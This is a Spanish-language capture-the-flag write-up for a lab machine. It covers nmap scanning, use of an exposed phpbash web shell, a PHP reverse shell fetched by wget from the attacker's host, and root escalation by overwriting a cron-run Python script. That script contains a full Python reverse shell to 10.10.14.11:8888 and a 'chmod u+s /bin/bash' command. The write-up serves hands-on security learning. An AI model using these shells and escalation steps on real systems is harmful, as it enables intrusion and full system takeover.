-- --
- Tags: #ejptmachine #cron #python #suid #echoSUIDpython
----

Aquí la unica dificultad es que a pesar de hacer tratamiento de tty en la maquina no abren ciertos programas necesarios como nano asique decidimos simplemente usar el comando echo en la escalada de privilegios.
https://www.youtube.com/watch?v=qj7A0WD-xCs&ab_channel=S4viOnLive%28BackupDirectosdeTwitch%29

` nmap -p- --min-rate 5000 -sCV -n 10.10.10.68 -oN portScan`

![Pasted image 20250111135435](../../Fotos/Pasted%20image%2020250111135435.png)

![Pasted image 20250111135739](../../Fotos/Pasted%20image%2020250111135739.png)

![Pasted image 20250111135906](../../Fotos/Pasted%20image%2020250111135906.png)

![Pasted image 20250111140243](../../Fotos/Pasted%20image%2020250111140243.png)

Al hacer click en phpbash.php nos entrega una shell

![Pasted image 20250111140255](../../Fotos/Pasted%20image%2020250111140255.png)

![Pasted image 20250111140347](../../Fotos/Pasted%20image%2020250111140347.png)

User Flag : 868e70155e12680df81d0a9d8784b671
- Despues de vulnerar la maquina la User Flag cambio a : 69aaae4ca38547a3775617b98dbd7f5c

![Pasted image 20250111141116](../../Fotos/Pasted%20image%2020250111141116.png)

Es importante ganar acceso directo al sistema para poder realizar la escalada de privilegios. Para ganar acceso al sistema se procede a insertar una reverse shell en el aplicativo.

*Cargamos una Reverse Shell*
![Pasted image 20250111141542](../../Fotos/Pasted%20image%2020250111141542.png)

![Pasted image 20250111141551](../../Fotos/Pasted%20image%2020250111141551.png)

`wget http://10.10.14.16:8000/reverse_shell.php`

![Pasted image 20250111142255](../../Fotos/Pasted%20image%2020250111142255.png)

![Pasted image 20250111142350](../../Fotos/Pasted%20image%2020250111142350.png)

**Se agrega en la ruta `/var/www/html/uploads` y se procede abrir desde la web para así ganar acceso al sistema desde la terminal local.**

`mv /tmp/reverse_shell.php /var/www/html/uploads`

![Pasted image 20250111142753](../../Fotos/Pasted%20image%2020250111142753.png)

![Pasted image 20250111143519](../../Fotos/Pasted%20image%2020250111143519.png)

![Pasted image 20250111143531](../../Fotos/Pasted%20image%2020250111143531.png)

Tratamiento

![Pasted image 20250111143741](../../Fotos/Pasted%20image%2020250111143741.png)

`Maquina Vulnerada`

---

*Escalada de Privilegios*
`sudo -l`

![Pasted image 20250111171046](../../Fotos/Pasted%20image%2020250111171046.png)

`sudo -u scriptmanager bash`

![Pasted image 20250111171055](../../Fotos/Pasted%20image%2020250111171055.png)

Existe un directorio scripts

![Pasted image 20250111171410](../../Fotos/Pasted%20image%2020250111171410.png)

-----

*Breve Explicacion*

![Pasted image 20250111183748](../../Fotos/Pasted%20image%2020250111183748.png)

- Esto nos da a entender de manera logica que si bien el .txt es propietario y grupo root y el .py como scriptmanager da a entender que como root ejecuta el .py ademas que revisaremos con **date**  y **ls -la** los tiempos y tendremos mejor noción de lo que sucede

- ----

test.txt

![Pasted image 20250111171511](../../Fotos/Pasted%20image%2020250111171511.png)

![Pasted image 20250111171517](../../Fotos/Pasted%20image%2020250111171517.png)

- testing 123! 

test.py

![Pasted image 20250111171535](../../Fotos/Pasted%20image%2020250111171535.png)

De esta forma nos damos cuenta que el contenido de test.txt se esta ejecutando constantemente en el directorio /script lo apreciamos con el comando date y ls -la 

![Pasted image 20250111171832](../../Fotos/Pasted%20image%2020250111171832.png)

-------------

INFORMATIVO
Incluiremos esto en el archivo al que tenemos acceso osea test.py, esto es una **Reverse Shell** en una archivo con extensión **.py** que se ejecuta a intervalos de tiempo regulares
```python
import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("10.10.14.11",8888));os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/sh","-i"]);
```

----
NECESARIO
Incluiremos esto en el archivo al que tenemos acceso osea test.py, esto es dar permisos **SUID** a la bash para pasar a root. En una archivo con extensión **.py** que se ejecuta a intervalos de tiempo regulares
```python
import os

os.system("chmod u+s /bin/bash")
```
------

Para que nos abriera nano tuvimos que poner la term screen si o si.

![Pasted image 20250111174701](../../Fotos/Pasted%20image%2020250111174701.png)

![Pasted image 20250111174729](../../Fotos/Pasted%20image%2020250111174729.png)

![Pasted image 20250111174738](../../Fotos/Pasted%20image%2020250111174738.png)

`export TERM=screen`

Puntualmente a pesar de esto igualmente tuvimos problemas con nano no hubo manera de hacerlo funcionar con tratamientos, decidí meter la data que necesito ene le archivo con `echo` simplemente de la siguiente manera:

`echo -e "import os\nos.system(\"chmod u+s /bin/bash\")" > test.py`

![Pasted image 20250111183457](../../Fotos/Pasted%20image%2020250111183457.png)

Revisamos los permisos ahora de la bin bash y como el script se ejecuta a intervalos de tiempo constantes, una vez ingresada la sintaxis anterior con `echo`, esperamos  ya se cambiaron los permisos y tenemos **SUID**

![Pasted image 20250111183509](../../Fotos/Pasted%20image%2020250111183509.png)

![Pasted image 20250111184037](../../Fotos/Pasted%20image%2020250111184037.png)

`Maquina Vulnerada`

![Pasted image 20250111184132](../../Fotos/Pasted%20image%2020250111184132.png)

Root Flag: eebd72af96e31d2ab107ae56107a8c43

